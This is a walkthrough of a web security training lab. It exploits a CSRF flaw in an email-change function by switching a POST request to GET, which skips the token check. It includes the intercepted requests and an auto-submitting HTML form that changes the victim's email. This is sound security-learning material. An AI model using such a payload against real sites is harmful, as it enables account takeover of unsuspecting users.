# Lab.2 CSRF where token validation depends on request method

## Challenge

 This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter` 

## Solution

First I open the lab, and go to the site, where I login with my creds `wiener` and change the email.

I send this `POST` request to the Burp Repeater, and there I see the `csrf` token.

```http
POST /my-account/change-email HTTP/2
...

email=test%40test.test&csrf=1k1F8gwWzXNpI5tO6O7wun23DxDbt7O1
```

If I change the csrf token I got a `400 Bad Request`.

Let's try to turn this into a `GET` Method.

There I could send the request with the following header:

```http
GET /my-account/change-email?email=ss%40ss.SS&csrf=1k1F8gwWzXNpI5tO6O7wun23DxDbt7Oe HTTP/2
```

And I got a `302 Found` and the address got changed. And also the `csrf` is modified from the original one.

This works even if I remove the `csrf token` completely.

So, now let's go to our exploit server, and put the following in the body:

```html
<form action="https://0ab200f70393ce7582a7b587004e0072.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="pwned&commat;vatraSec&period;net" />
</form>
<script>
        document.forms[0].submit();
</script>
```

So, this will use a `GET` method, to change the email of the victim user.

NOTE: You must be careful, to encode the email to `HTML Entity` otherwise it will not work. And the lab is solved!
